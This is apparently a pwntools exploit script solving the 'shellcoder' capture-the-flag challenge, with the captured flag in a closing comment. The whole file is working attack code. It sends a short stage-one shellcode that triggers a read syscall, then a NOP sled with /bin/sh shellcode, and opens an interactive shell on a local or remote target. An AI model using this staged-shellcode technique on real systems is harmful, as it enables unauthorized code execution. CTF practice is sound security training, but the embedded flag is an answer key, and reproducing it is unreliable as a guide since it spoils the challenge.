# File: exp.py
# Author: raycp
# Date: 2019-05-20
# Description: exp for shellcoder

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("./shellcoder")

#pdbg.context.log_level="debug"
pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
#pdbg.debug("2.23")
pdbg.remote('139.180.215.222', 20002)
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")
#membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base
def pwn():
    #pdbg.bp([0x3ae])
    p.recvuntil(":")
    payload=asm("""
    xchg rsi,rdi;
    xor edx,esi;
    syscall
    """
    )
    log.info("shellcode len: %x"%len(payload))
    p.send(payload)
    raw_input("go>")
    payload="\x90"*0x20+asm(shellcraft.amd64.sh())
    p.send(payload)
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}

